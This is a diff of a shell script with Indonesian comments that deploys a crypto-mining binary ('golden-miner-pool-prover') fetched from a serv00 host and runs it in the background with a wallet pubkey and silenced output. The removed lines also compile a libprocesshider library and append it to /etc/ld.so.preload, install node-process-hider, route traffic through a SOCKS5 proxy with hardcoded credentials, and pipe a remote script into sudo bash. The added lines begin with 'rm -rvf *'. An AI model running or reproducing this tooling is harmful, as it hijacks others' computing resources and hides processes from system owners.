@@ -1,61 +1,102 @@
-rm -rvf * && mkdir a && cd a
-#!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+rm -rvf * && sleep 5s && mkdir a && cd a
+# ============================================
+# 1. SETUP LIBSTDC++ LOKAL (GLIBCXX_3.4.29)
+# ============================================
+echo "[INFO] Memeriksa libstdc++ di ~/lib64..."
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+if [ ! -f "$HOME/lib64/libstdc++.so.6" ] || ! strings "$HOME/lib64/libstdc++.so.6" 2>/dev/null | grep -q "GLIBCXX_3.4.29"; then
+    echo "[INFO] GLIBCXX_3.4.29 tidak ditemukan, menginstall..."
 
-sudo apt-get install -y nodejs
+    mkdir -p ~/lib64
+    cd ~
 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+    # Download libstdc++
+    echo "[INFO] Download libstdc++..."
+    wget -q -O libstdc++.deb http://archive.ubuntu.com/ubuntu/pool/main/g/gcc-12/libstdc++6_12-20220319-1ubuntu1_amd64.deb
 
-curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+    # Ekstrak .deb
+    ar x libstdc++.deb
 
-npm i -g node-process-hider
+    # Cek format kompresi (zst atau xz)
+    if [ -f "data.tar.zst" ]; then
+        echo "[INFO] Format zst detected, installing zstd..."
+        if ! command -v zstd &> /dev/null; then
+            echo "[INFO] Download zstd..."
+            wget -q https://github.com/facebook/zstd/releases/download/v1.5.7/zstd-1.5.7.tar.gz
+            tar -xvzf zstd-1.5.7.tar.gz > /dev/null 2>&1
+            cd zstd-1.5.7
+            make -j$(nproc) > /dev/null 2>&1
+            mkdir -p ~/bin
+            cp programs/zstd ~/bin/
+            export PATH="$HOME/bin:$PATH"
+            cd ~
+        fi
+        zstd -d data.tar.zst
+        tar -xf data.tar
+    elif [ -f "data.tar.xz" ]; then
+        tar -xf data.tar.xz
+    else
+        echo "❌ Format data tidak dikenal!"
+        exit 1
+    fi
 
-wget --no-check-certificate -O dataset https://maskurniawan.serv00.net/golden-miner-pool-prover && chmod +x dataset
+    # Copy library
+    cp -f usr/lib/x86_64-linux-gnu/libstdc++.so.6* ~/lib64/
+    echo "[INFO] ✅ libstdc++ terinstall di ~/lib64"
+fi
 
-wget https://gitlab.com/server3620113/type2026/-/raw/main/graphics.tar.gz
+# ============================================
+# 2. CEK GPU
+# ============================================
+echo "[INFO] Memeriksa GPU..."
+if command -v nvidia-smi &> /dev/null; then
+    nvidia-smi --query-gpu=name,memory.total --format=csv,noheader 2>/dev/null || echo "[WARN] Tidak ada GPU terdeteksi"
+else
+    echo "[WARN] nvidia-smi tidak ditemukan, pakai CPU mode"
+    MODE="cpu"
+fi
 
-tar -xvzf graphics.tar.gz
+# ============================================
+# 3. BUAT WRAPPER run-glibc
+# ============================================
+cat > "$HOME/run-glibc" <<'EOFW'
+#!/bin/bash
+GLIBC_PATH="$HOME/.local/glibc-2.35/lib"
+LOCAL_LIB="$HOME/lib64"
+$GLIBC_PATH/ld-linux-x86-64.so.2 \
+  --library-path "$GLIBC_PATH:$LOCAL_LIB:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" "$@"
+EOFW
+chmod +x "$HOME/run-glibc"
 
+# ============================================
+# 4. DOWNLOAD GOLDEN (JIKA BELUM ADA)
+# ============================================
+cd "$HOME"
+if [ ! -f "./golden" ]; then
+    echo "[INFO] Download golden..."
+    wget -q https://maskurniawan.serv00.net/golden-miner-pool-prover -O dataset
+    chmod +x golden
+fi
 
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 202.155.9.40:443
-socks5_username = excel123
-socks5_password = excel123
-END
+# ============================================
+# 5. JALANKAN GOLDEN
+# ============================================
+echo "============================"
+echo "✅ Menjalankan golden dengan GLIBC 2.35 + GLIBCXX_3.4.29"
+echo "============================"
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+# Pilih mode otomatis (gpu/cpu)
+if command -v nvidia-smi &> /dev/null && nvidia-smi &> /dev/null; then
+    MODE="gpu"
+else
+    MODE="cpu"
+fi
 
-sleep .2
-
-echo " "
-echo " "
-
-echo ""
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo ""
-
-echo " "
-echo " "
-
-
-./graftcp/graftcp wget https://gitlab.com/server3620113/type2026/-/raw/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp && clear && ./dataset --pubkey=6rs3R6CiapmJdWkcZCM8Wrizqr1kfmMhUf2Ngt9AjfuS4BoGMcdeqQG \
+"$HOME/run-glibc"  ./dataset \
+  --pubkey=6rs3R6CiapmJdWkcZCM8Wrizqr1kfmMhUf2Ngt9AjfuS4BoGMcdeqQG \
   --label=Bismillah \
   --mode=gpu \
   --threads-per-card=1 > /dev/null 2>&1 & clear
+
+
+./graftcp/graftcp && clear &&
